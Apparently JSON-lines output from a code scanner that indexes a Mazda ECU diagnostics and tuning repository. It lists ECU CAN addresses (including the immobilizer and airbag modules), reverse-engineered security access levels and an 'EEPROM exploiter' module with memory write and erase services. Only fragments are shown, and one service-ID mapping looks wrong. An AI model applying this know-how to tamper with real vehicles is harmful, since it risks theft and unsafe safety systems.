"protocol": "0x[0-9A-Fa-f]+", "content": "EXTENDED = 0x03"}, {"type": "protocol", "line": 34, "protocol": "0x[0-9A-Fa-f]+", "content": "SAFETY = 0x04"}, {"type": "protocol", "line": 35, "protocol": "0x[0-9A-Fa-f]+", "content": "MANUFACTURER = 0x40"}, {"type": "protocol", "line": 39, "protocol": "0x[0-9A-Fa-f]+", "content": "LEVEL_1 = 0x01"}, {"type": "protocol", "line": 40, "protocol": "0x[0-9A-Fa-f]+", "content": "LEVEL_2 = 0x02"}, {"type": "protocol", "line": 41, "protocol": "0x[0-9A-Fa-f]+", "content": "LEVEL_3 = 0x03"}, {"type": "protocol", "line": 42, "protocol": "0x[0-9A-Fa-f]+", "content": "LEVEL_4 = 0x04"}, {"type": "protocol", "line": 43, "protocol": "0x[0-9A-Fa-f]+", "content": "LEVEL_5 = 0x05"}, {"type": "protocol", "line": 44, "protocol": "0x[0-9A-Fa-f]+", "content": "LEVEL_6 = 0x06"}, {"type": "protocol", "line": 45, "protocol": "0x[0-9A-Fa-f]+", "content": "LEVEL_7 = 0x07"}, {"type": "protocol", "line": 55, "protocol": "0x[0-9A-Fa-f]+", "content": "priority: int = 0x06"}, {"type": "protocol", "line": 64, "protocol": "0x[0-9A-Fa-f]+", "content": "'ENGINE_ECU': 0x7E0, 'ENGINE_ECU_RESP': 0x7E8, 'TCM': 0x7E1, 'TCM_RESP': 0x7E9,"}, {"type": "protocol", "line": 65, "protocol": "0x[0-9A-Fa-f]+", "content": "'ABS': 0x7E2, 'ABS_RESP': 0x7EA, 'AIRBAG': 0x7E3, 'AIRBAG_RESP': 0x7EB,"}, {"type": "protocol", "line": 66, "protocol": "0x[0-9A-Fa-f]+", "content": "'INSTRUMENT_CLUSTER': 0x7E4, 'INSTRUMENT_CLUSTER_RESP': 0x7EC,"}, {"type": "protocol", "line": 67, "protocol": "0x[0-9A-Fa-f]+", "content": "'IMMOBILIZER': 0x7E5, 'IMMOBILIZER_RESP': 0x7ED, 'BCM': 0x7E6, 'BCM_RESP': 0x7EE,"}, {"type": "protocol", "line": 68, "protocol": "0x[0-9A-Fa-f]+", "content": "'RADIO': 0x7E7, 'RADIO_RESP': 0x7EF, 'GATEWAY': 0x750, 'GATEWAY_RESP': 0x758"}, {"type": "protocol", "line": 71, "protocol": "CAN", "content": "def __init__(self, protocol: MazdaProtocol = MazdaProtocol.ISO_15765_4_CAN):"}, {"type": "protocol", "line": 80, "protocol": "CAN", "content": "if self.protocol in [MazdaProtocol.ISO_15765_4_CAN, MazdaProtocol.ISO_15765_4_CAN_29]:"}, {"type": "protocol", "line": 82, "protocol": "KWP", "content": "elif self.protocol in [MazdaProtocol.ISO_9141_2, MazdaProtocol.ISO_14230_4_KWP]:"}, {"type": "protocol", "line": 84, "protocol": "CAN", "content": "elif self.protocol in [MazdaProtocol.MAZDA_CAN_HS, MazdaProtocol.MAZDA_CAN_MS]:"}, {"type": "protocol", "line": 96, "protocol": "CAN", "content": "logger.debug(\"Initialized CAN protocol for Mazda vehicle\")"}, {"type": "protocol", "line": 102, "protocol": "CAN", "content": "logger.debug(\"Initialized Mazda proprietary CAN protocol\")"}, {"type": "protocol", "line": 112, "protocol": "0x[0-9A-Fa-f]+", "content": "source_address=0x7DF,"}, {"type": "protocol", "line": 113, "protocol": "0x[0-9A-Fa-f]+", "content": "service_id=0x3E,"}, {"type": "protocol", "line": 114, "protocol": "0x[0-9A-Fa-f]+", "content": "sub_function=0x00,"}, {"type": "protocol", "line": 134, "protocol": "0x[0-9A-Fa-f]+", "content": "response_service_id = message.service_id + 0x40"}, {"type": "protocol", "line": 135, "protocol": "0x[0-9A-Fa-f]+", "content": "if message.service_id == 0x10: # Start Diagnostic Session"}, {"type": "protocol", "line": 137, "protocol": "0x[0-9A-Fa-f]+", "content": "if message.service_id == 0x22: # Read Data By Identifier"}, {"type": "protocol", "line": 139, "protocol": "0x[0-9A-Fa-f]+", "content": "if message.service_id == 0x3E: # Tester Present"}, {"type": "protocol", "line": 140, "protocol": "0x[0-9A-Fa-f]+", "content": "return bytes([response_service_id, 0x00])"}, {"type": "protocol", "line": 146, "protocol": "0x[0-9A-Fa-f]+", "content": "if message.sub_function != 0x00:"}, {"type": "protocol", "line": 149, "protocol": "CAN", "content": "if self.protocol in [MazdaProtocol.ISO_15765_4_CAN, MazdaProtocol.ISO_15765_4_CAN_29]:"}, {"type": "protocol", "line": 156, "protocol": "0x[0-9A-Fa-f]+", "content": "expected_service = original_message.service_id + 0x40"}], "hardware_assumptions": [{"type": "hardware", "line": 37, "hardware": "ECU", "content": "class SecurityAccessLevel(IntEnum):"}, {"type": "hardware", "line": 38, "hardware": "ECU", "content": "\"\"\"Security Access Levels - Reverse Engineered\"\"\""}, {"type": "hardware", "line": 63, "hardware": "ECU", "content": "ECU_ADDRESSES = {"}, {"type": "hardware", "line": 64, "hardware": "ECU", "content": "'ENGINE_ECU': 0x7E0, 'ENGINE_ECU_RESP': 0x7E8, 'TCM': 0x7E1, 'TCM_RESP': 0x7E9,"}, {"type": "hardware", "line": 64, "hardware": "TCM", "content": "'ENGINE_ECU': 0x7E0, 'ENGINE_ECU_RESP': 0x7E8, 'TCM': 0x7E1, 'TCM_RESP': 0x7E9,"}, {"type": "hardware", "line": 65, "hardware": "ABS", "content": "'ABS': 0x7E2, 'ABS_RESP': 0x7EA, 'AIRBAG': 0x7E3, 'AIRBAG_RESP': 0x7EB,"}, {"type": "hardware", "line": 67, "hardware": "BCM", "content": "'IMMOBILIZER': 0x7E5, 'IMMOBILIZER_RESP': 0x7ED, 'BCM': 0x7E6, 'BCM_RESP': 0x7EE,"}, {"type": "hardware", "line": 67, "hardware": "immobilizer", "content": "'IMMOBILIZER': 0x7E5, 'IMMOBILIZER_RESP': 0x7ED, 'BCM': 0x7E6, 'BCM_RESP': 0x7EE,"}, {"type": "hardware", "line": 74, "hardware": "ECU", "content": "self.security_level = SecurityAccessLevel.LEVEL_1"}, {"type": "hardware", "line": 77, "hardware": "vehicle", "content": "def connect_to_vehicle(self) -> bool:"}, {"type": "hardware", "line": 78, "hardware": "vehicle", "content": "\"\"\"Establish connection with vehicle using Mazda protocol.\"\"\""}, {"type": "hardware", "line": 89, "hardware": "vehicle", "content": "logger.info(\"Successfully connected to vehicle\")"}, {"type": "hardware", "line": 92, "hardware": "vehicle", "content": "logger.error(f\"Failed to connect to vehicle: {e}\")"}, {"type": "hardware", "line": 96, "hardware": "vehicle", "content": "logger.debug(\"Initialized CAN protocol for Mazda vehicle\")"}, {"type": "hardware", "line": 99, "hardware": "vehicle", "content": "logger.debug(\"Initialized K-line protocol for Mazda vehicle\")"}, {"type": "hardware", "line": 105, "hardware": "vehicle", "content": "\"\"\"Test communication with vehicle gateway. This is a simulation.\"\"\""}, {"type": "hardware", "line": 106, "hardware": "vehicle", "content": "logger.info(\"Simulating communication test with vehicle gateway...\")"}, {"type": "hardware", "line": 111, "hardware": "ECU", "content": "target_address=self.ECU_ADDRESSES['GATEWAY'],"}, {"type": "hardware", "line": 171, "hardware": "vehicle", "content": "logger.info(\"Disconnected from vehicle\")"}, {"type": "hardware", "line": 174, "hardware": "vehicle", "content": "def connect_to_vehicle():"}, {"type": "hardware", "line": 176, "hardware": "vehicle", "content": "Instantiates the diagnostic protocol and attempts to connect to the vehicle."}, {"type": "hardware", "line": 178, "hardware": "vehicle", "content": "logging.info(\"Attempting to connect to vehicle...\")"}, {"type": "hardware", "line": 180, "hardware": "vehicle", "content": "if protocol.connect_to_vehicle():"}], "security_logic": [{"type": "security_pattern", "line": 11, "pattern": "hash", "content": "import hashlib"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["diagnostic"]}
{"file_path": "diagnostics/abs_module.py", "lines_read": 29, "features_found": [{"type": "function", "name": "read_wheel_speeds", "line": 20}, {"type": "function", "name": "read_dtcs", "line": 24}, {"type": "function", "name": "clear_dtcs", "line": 27}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "List", "line": null}], "components_found": [{"type": "class", "name": "AbsWheelSpeed", "line": 13}, {"type": "class", "name": "AbsModule", "line": 19}], "algorithms": [], "protocols": [{"type": "protocol", "line": 3, "protocol": "CAN", "content": "Real implementation will use different CAN IDs / services; for now this"}], "hardware_assumptions": [{"type": "hardware", "line": 1, "hardware": "ABS", "content": "\"\"\"ABS diagnostics \u2013 placeholder module."}, {"type": "hardware", "line": 13, "hardware": "ABS", "content": "class AbsWheelSpeed:"}, {"type": "hardware", "line": 19, "hardware": "ABS", "content": "class AbsModule:"}, {"type": "hardware", "line": 20, "hardware": "ABS", "content": "def read_wheel_speeds(self) -> AbsWheelSpeed:"}, {"type": "hardware", "line": 22, "hardware": "ABS", "content": "return AbsWheelSpeed(50.0, 50.0, 50.0, 50.0)"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["diagnostic"]}
{"file_path": "diagnostics/bcm_module.py", "lines_read": 18, "features_found": [{"type": "function", "name": "read_swas_state", "line": 11}, {"type": "function", "name": "set_swas_state", "line": 15}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "dataclass", "line": null}], "components_found": [{"type": "class", "name": "SwasState", "line": 7}, {"type": "class", "name": "BcmModule", "line": 10}], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 1, "hardware": "BCM", "content": "\"\"\"BCM diagnostics \u2013 placeholder interface.\"\"\""}, {"type": "hardware", "line": 10, "hardware": "BCM", "content": "class BcmModule:"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["diagnostic"]}
{"file_path": "diagnostics/dtc_manager.py", "lines_read": 34, "features_found": [{"type": "function", "name": "__init__", "line": 18}, {"type": "function", "name": "scan_all", "line": 21}, {"type": "function", "name": "clear_ecm", "line": 28}, {"type": "function", "name": "clear_all", "line": 32}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "comms.mazda_ecu", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "List", "line": null}, {"type": "import", "module": "MazdaEcu", "line": null}], "components_found": [{"type": "class", "name": "DTC", "line": 11}, {"type": "class", "name": "DtcManager", "line": 17}], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 1, "hardware": "BCM", "content": "\"\"\"DTC manager \u2013 coordinates DTC operations across ECM/ABS/SRS/BCM.\"\"\""}, {"type": "hardware", "line": 1, "hardware": "ABS", "content": "\"\"\"DTC manager \u2013 coordinates DTC operations across ECM/ABS/SRS/BCM.\"\"\""}, {"type": "hardware", "line": 1, "hardware": "SRS", "content": "\"\"\"DTC manager \u2013 coordinates DTC operations across ECM/ABS/SRS/BCM.\"\"\""}, {"type": "hardware", "line": 8, "hardware": "ECU", "content": "from comms.mazda_ecu import MazdaEcu"}, {"type": "hardware", "line": 17, "hardware": "TCM", "content": "class DtcManager:"}, {"type": "hardware", "line": 18, "hardware": "ECU", "content": "def __init__(self, ecu: MazdaEcu):"}, {"type": "hardware", "line": 19, "hardware": "ECU", "content": "self.ecu = ecu"}, {"type": "hardware", "line": 24, "hardware": "ECU", "content": "for code in self.ecu.read_dtc_ecm():"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["diagnostic"]}
{"file_path": "diagnostics/freeze_frame.py", "lines_read": 11, "features_found": [{"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "Dict,", "line": null}], "components_found": [{"type": "class", "name": "FreezeFrame", "line": 8}], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["diagnostic"]}
{"file_path": "diagnostics/live_data.py", "lines_read": 48, "features_found": [{"type": "function", "name": "__init__", "line": 17}, {"type": "function", "name": "start", "line": 24}, {"type": "function", "name": "_run", "line": 31}, {"type": "function", "name": "stop", "line": 44}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "comms.mazda_ecu", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "threading", "line": null}, {"type": "import", "module": "Callable,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "MazdaEcu,", "line": null}], "components_found": [{"type": "class", "name": "LiveDataSample", "line": 12}, {"type": "class", "name": "LiveDataPoller", "line": 16}], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 1, "hardware": "ECU", "content": "\"\"\"Live data polling based on MazdaEcu.read_live_data().\"\"\""}, {"type": "hardware", "line": 9, "hardware": "ECU", "content": "from comms.mazda_ecu import MazdaEcu, LiveData"}, {"type": "hardware", "line": 17, "hardware": "ECU", "content": "def __init__(self, ecu: MazdaEcu, interval: float = 0.2):"}, {"type": "hardware", "line": 18, "hardware": "ECU", "content": "self.ecu = ecu"}, {"type": "hardware", "line": 35, "hardware": "ECU", "content": "data = self.ecu.read_live_data()"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["diagnostic"]}
{"file_path": "diagnostics/live_data_service.py", "lines_read": 83, "features_found": [{"type": "function", "name": "__init__", "line": 28}, {"type": "function", "name": "_read_did_u16", "line": 31}, {"type": "function", "name": "read_rpm", "line": 35}, {"type": "function", "name": "read_throttle", "line": 38}, {"type": "function", "name": "read_engine_load", "line": 41}, {"type": "function", "name": "read_boost_psi", "line": 44}, {"type": "function", "name": "read_fuel_pressure_psi", "line": 48}, {"type": "function", "name": "read_ignition_advance", "line": 51}, {"type": "function", "name": "read_iat", "line": 54}, {"type": "function", "name": "read_ect", "line": 57}, {"type": "function", "name": "read_vehicle_speed", "line": 60}, {"type": "function", "name": "read_all_live_data", "line": 63}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "comms.uds_protocol", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "TYPE_CHECKING", "line": null}, {"type": "import", "module": "UdsClient", "line": null}], "components_found": [{"type": "class", "name": "LiveData", "line": 12}, {"type": "class", "name": "LiveDataService", "line": 27}], "algorithms": [], "protocols": [{"type": "protocol", "line": 36, "protocol": "0x[0-9A-Fa-f]+", "content": "return self._read_did_u16(0x0C)"}, {"type": "protocol", "line": 39, "protocol": "0x[0-9A-Fa-f]+", "content": "return self._read_did_u16(0x11) / 10"}, {"type": "protocol", "line": 42, "protocol": "0x[0-9A-Fa-f]+", "content": "return self._read_did_u16(0x04) / 100"}, {"type": "protocol", "line": 45, "protocol": "0x[0-9A-Fa-f]+", "content": "boost_kpa = self._read_did_u16(0x70)"}, {"type": "protocol", "line": 49, "protocol": "0x[0-9A-Fa-f]+", "content": "return self._read_did_u16(0x5A) * 0.145038"}, {"type": "protocol", "line": 52, "protocol": "0x[0-9A-Fa-f]+", "content": "return self._read_did_u16(0x0E) / 10"}, {"type": "protocol", "line": 55, "protocol": "0x[0-9A-Fa-f]+", "content": "return self._read_did_u16(0x0F) - 40"}, {"type": "protocol", "line": 58, "protocol": "0x[0-9A-Fa-f]+", "content": "return self._read_did_u16(0x05) - 40"}, {"type": "protocol", "line": 61, "protocol": "0x[0-9A-Fa-f]+", "content": "return self._read_did_u16(0x0D)"}], "hardware_assumptions": [{"type": "hardware", "line": 24, "hardware": "vehicle", "content": "vehicle_speed_kph: float"}, {"type": "hardware", "line": 60, "hardware": "vehicle", "content": "def read_vehicle_speed(self) -> int:"}, {"type": "hardware", "line": 81, "hardware": "vehicle", "content": "vehicle_speed_kph=self.read_vehicle_speed(),"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["diagnostic"]}
{"file_path": "diagnostics/srs_module.py", "lines_read": 23, "features_found": [{"type": "function", "name": "read_status", "line": 14}, {"type": "function", "name": "read_dtcs", "line": 18}, {"type": "function", "name": "clear_dtcs", "line": 21}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "List", "line": null}], "components_found": [{"type": "class", "name": "SrsStatus", "line": 8}, {"type": "class", "name": "SrsModule", "line": 13}], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 1, "hardware": "SRS", "content": "\"\"\"SRS (airbag) diagnostics \u2013 placeholder interface.\"\"\""}, {"type": "hardware", "line": 8, "hardware": "SRS", "content": "class SrsStatus:"}, {"type": "hardware", "line": 13, "hardware": "SRS", "content": "class SrsModule:"}, {"type": "hardware", "line": 14, "hardware": "SRS", "content": "def read_status(self) -> SrsStatus:"}, {"type": "hardware", "line": 16, "hardware": "SRS", "content": "return SrsStatus(False, False, False)"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["diagnostic"]}
{"file_path": "docs/ARCHITECTURE.md", "lines_read": 19, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "docs/ASSISTANT_PROMPTS/COPILOT_TASKS.md", "lines_read": 9, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "docs/ASSISTANT_PROMPTS/HIGH_LEVEL_DIRECTIVE.md", "lines_read": 11, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "docs/CONTRIBUTING.md", "lines_read": 2, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "docs/ECU_PROTOCOLS.md", "lines_read": 2, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "docs/IMPLEMENTATION_FLOWS.md", "lines_read": 9, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "docs/MAPS_REFERENCE.md", "lines_read": 2, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "docs/PRODUCT_SPEC.md", "lines_read": 18, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "docs/ROADMAP.md", "lines_read": 7, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "docs/SAFETY_MODEL.md", "lines_read": 2, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "eeprom_exploiter.py", "lines_read": 712, "features_found": [{"type": "function", "name": "__init__", "line": 71}, {"type": "function", "name": "get_flash_operations", "line": 652}, {"type": "function", "name": "get_backup_list", "line": 656}, {"type": "function", "name": "clear_backups", "line": 667}, {"type": "function", "name": "__del__", "line": 706}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "models", "line": null}, {"type": "import", "module": "mazda_memory_map", "line": null}, {"type": "import", "module": "base_exploiter", "line": null}, {"type": "import", "module": "asyncio", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass,", "line": null}, {"type": "import", "module": "Enum", "line": null}, {"type": "import", "module": "io", "line": null}, {"type": "import", "module": "(", "line": null}, {"type": "import", "module": "MazdaMemoryMap,", "line": null}, {"type": "import", "module": "BaseExploiter,", "line": null}], "components_found": [{"type": "class", "name": "EEPROMError", "line": 24}, {"type": "class", "name": "EEPROMAccessError", "line": 29}, {"type": "class", "name": "EEPROMChecksumError", "line": 34}, {"type": "class", "name": "EEPROMExploiter", "line": 39}], "algorithms": [{"type": "algorithm_function", "line": 482, "content": "async def calculate_checksum(self, address: int, size: int,"}], "protocols": [{"type": "protocol", "line": 18, "protocol": "CAN", "content": "LogEntry, CANMessage, OBDPacket, EEPROMOperation, ExploiterState"}, {"type": "protocol", "line": 18, "protocol": "OBD", "content": "LogEntry, CANMessage, OBDPacket, EEPROMOperation, ExploiterState"}, {"type": "protocol", "line": 47, "protocol": "0x[0-9A-Fa-f]+", "content": "\"READ_MEMORY\": 0x23,"}, {"type": "protocol", "line": 48, "protocol": "0x[0-9A-Fa-f]+", "content": "\"WRITE_MEMORY\": 0x3D,"}, {"type": "protocol", "line": 49, "protocol": "0x[0-9A-Fa-f]+", "content": "\"ERASE_MEMORY\": 0x3E,"}, {"type": "protocol", "line": 50, "protocol": "0x[0-9A-Fa-f]+", "content": "\"CHECKSUM_MEMORY\": 0x31,"}, {"type": "protocol", "line": 51, "protocol": "0x[0-9A-Fa-f]+", "content": "\"REQUEST_DOWNLOAD\": 0x34,"}, {"type": "protocol", "line": 52, "protocol": "0x[0-9A-Fa-f]+", "content": "\"TRANSFER_DATA\": 0x36,"}, {"type": "protocol", "line": 53, "protocol": "0x[0-9A-Fa-f]+", "content": "\"TRANSFER_EXIT\": 0x37,"}, {"type": "protocol", "line": 54, "protocol": "0x[0-9A-Fa-f]+", "content": "\"READ_DTC\": 0x19,"}, {"type": "protocol", "line": 55, "protocol": "0x[0-9A-Fa-f]+", "content": "\"CLEAR_DTC\": 0x19,"}, {"type": "protocol", "line": 132, "protocol": "0x[0-9A-Fa-f]+", "content": "struct.pack(\"<IH\", 0x000000, 1)  # Read 1 byte from address 0"}, {"type": "protocol", "line": 149, "protocol": "0x[0-9A-Fa-f]+", "content": "0x1A,  # Read identifier command"}, {"type": "protocol", "line": 150, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x81])  # EEPROM identifier sub-function"}, {"type": "protocol", "line": 165, "protocol": "OBD", "content": "data: bytes) -> OBDPacket:"}, {"type": "protocol", "line": 167, "protocol": "OBD", "content": "Send EEPROM-specific command via OBD."}, {"type": "protocol", "line": 174, "protocol": "OBD", "content": "OBD response packet"}, {"type": "protocol", "line": 187, "protocol": "0x[0-9A-Fa-f]+", "content": "if len(response.data) > 0 and response.data[0] == service_id + 0x40:"}, {"type": "protocol", "line": 192, "protocol": "0x[0-9A-Fa-f]+", "content": "response.data[0] == 0x7F and"}, {"type": "protocol", "line": 194, "protocol": "0x[0-9A-Fa-f]+", "content": "error_code = response.data[2] if len(response.data) > 2 else 0x00"}, {"type": "protocol", "line": 510, "protocol": "0x[0-9A-Fa-f]+", "content": "\"crc32\": format(struct.unpack('>I', struct.pack('>I', 0xFFFFFFFF))[0] ^ 0xFFFFFFFF, '08X'),"}], "hardware_assumptions": [{"type": "hardware", "line": 2, "hardware": "ECU", "content": "EEPROMExploiter - EEPROM memory access and flash operations for Mazda ECU."}, {"type": "hardware", "line": 17, "hardware": "ECU", "content": "SecurityLevel, SecurityCredentials, FlashOperation, FlashState,"}, {"type": "hardware", "line": 41, "hardware": "ECU", "content": "EEPROM exploitation module for Mazda ECU."}, {"type": "hardware", "line": 200, "hardware": "ECU", "content": "credentials: Optional[SecurityCredentials] = None) -> OperationResult:"}, {"type": "hardware", "line": 207, "hardware": "ECU", "content": "credentials: Security credentials"}, {"type": "hardware", "line": 216, "hardware": "ECU", "content": "self._validate_security(SecurityLevel.READ_ONLY, \"read EEPROM\")"}, {"type": "hardware", "line": 224, "hardware": "ECU", "content": "return await self._execute_with_retry("}, {"type": "hardware", "line": 262, "hardware": "ECU", "content": "credentials: Optional[SecurityCredentials] = None,"}, {"type": "hardware", "line": 270, "hardware": "ECU", "content": "credentials: Security credentials"}, {"type": "hardware", "line": 282, "hardware": "ECU", "content": "self._validate_security(SecurityLevel.TUNING, \"write EEPROM\")"}, {"type": "hardware", "line": 294, "hardware": "ECU", "content": "return await self._execute_with_retry("}, {"type": "hardware", "line": 349, "hardware": "ECU", "content": "credentials: Optional[SecurityCredentials] = None) -> OperationResult:"}, {"type": "hardware", "line": 356, "hardware": "ECU", "content": "credentials: Security credentials"}, {"type": "hardware", "line": 365, "hardware": "ECU", "content": "self._validate_security(SecurityLevel.FLASH, \"erase EEPROM\")"}, {"type": "hardware", "line": 369, "hardware": "ECU", "content": "return await self._execute_with_retry("}, {"type": "hardware", "line": 395, "hardware": "ECU", "content": "credentials: Optional[SecurityCredentials] = None) -> OperationResult:"}, {"type": "hardware", "line": 402, "hardware": "ECU", "content": "credentials: Security credentials"}, {"type": "hardware", "line": 414, "hardware": "ECU", "content": "self._validate_security(SecurityLevel.DIAGNOSTIC, \"backup EEPROM\")"}, {"type": "hardware", "line": 445, "hardware": "ECU", "content": "credentials: Optional[SecurityCredentials] = None) -> OperationResult:"}, {"type": "hardware", "line": 452, "hardware": "ECU", "content": "credentials: Security credentials"}, {"type": "hardware", "line": 461, "hardware": "ECU", "content": "self._validate_security(SecurityLevel.FLASH, \"restore EEPROM\")"}, {"type": "hardware", "line": 483, "hardware": "ECU", "content": "credentials: Optional[SecurityCredentials] = None) -> OperationResult:"}, {"type": "hardware", "line": 490, "hardware": "ECU", "content": "credentials: Security credentials"}, {"type": "hardware", "line": 499, "hardware": "ECU", "content": "self._validate_security(SecurityLevel.READ_ONLY, \"calculate checksum\")"}, {"type": "hardware", "line": 522, "hardware": "ECU", "content": "credentials: Optional[SecurityCredentials] = None) -> OperationResult:"}, {"type": "hardware", "line": 529, "hardware": "ECU", "content": "credentials: Security credentials"}, {"type": "hardware", "line": 538, "hardware": "ECU", "content": "self._validate_security(SecurityLevel.READ_ONLY, \"verify EEPROM\")"}, {"type": "hardware", "line": 674, "hardware": "ECU", "content": "async def get_eeprom_info(self, credentials: Optional[SecurityCredentials] = None) -> OperationResul"}, {"type": "hardware", "line": 679, "hardware": "ECU", "content": "credentials: Security credentials"}, {"type": "hardware", "line": 688, "hardware": "ECU", "content": "self._validate_security(SecurityLevel.READ_ONLY, \"get EEPROM info\")"}], "security_logic": [{"type": "security_pattern", "line": 9, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 112, "pattern": "key", "content": "for operation_id in list(self.flash_operations.keys()):"}, {"type": "security_pattern", "line": 424, "pattern": "key", "content": "backup_key = hash((address, size, time.time()))"}, {"type": "security_pattern", "line": 424, "pattern": "hash", "content": "backup_key = hash((address, size, time.time()))"}, {"type": "security_pattern", "line": 425, "pattern": "key", "content": "self.backup_data[backup_key] = backup_data"}, {"type": "security_pattern", "line": 428, "pattern": "hash", "content": "checksum = hashlib.sha256(backup_data).hexdigest()"}, {"type": "security_pattern", "line": 436, "pattern": "key", "content": "\"backup_key\": backup_key,"}, {"type": "security_pattern", "line": 444, "pattern": "key", "content": "async def restore_eeprom(self, backup_key: int, address: Optional[int] = None,"}, {"type": "security_pattern", "line": 450, "pattern": "key", "content": "backup_key: Backup identifier"}, {"type": "security_pattern", "line": 464, "pattern": "key", "content": "if backup_key not in self.backup_data:"}, {"type": "security_pattern", "line": 465, "pattern": "key", "content": "raise EEPROMError(f\"Backup key not found: {backup_key}\")"}, {"type": "security_pattern", "line": 467, "pattern": "key", "content": "backup_data = self.backup_data[backup_key]"}, {"type": "security_pattern", "line": 478, "pattern": "key", "content": "self.logger.info(f\"EEPROM restored from backup: key {backup_key}, address 0x{address:06X}\")"}, {"type": "security_pattern", "line": 511, "pattern": "hash", "content": "\"sha256\": hashlib.sha256(data).hexdigest(),"}, {"type": "security_pattern", "line": 512, "pattern": "hash", "content": "\"md5\": hashlib.md5(data).hexdigest(),"}, {"type": "security_pattern", "line": 659, "pattern": "key", "content": "for key, data in self.backup_data.items():"}, {"type": "security_pattern", "line": 661, "pattern": "key", "content": "\"key\": key,"}, {"type": "security_pattern", "line": 663, "pattern": "hash", "content": "\"checksum\": hashlib.sha256(data).hexdigest()[:16],"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
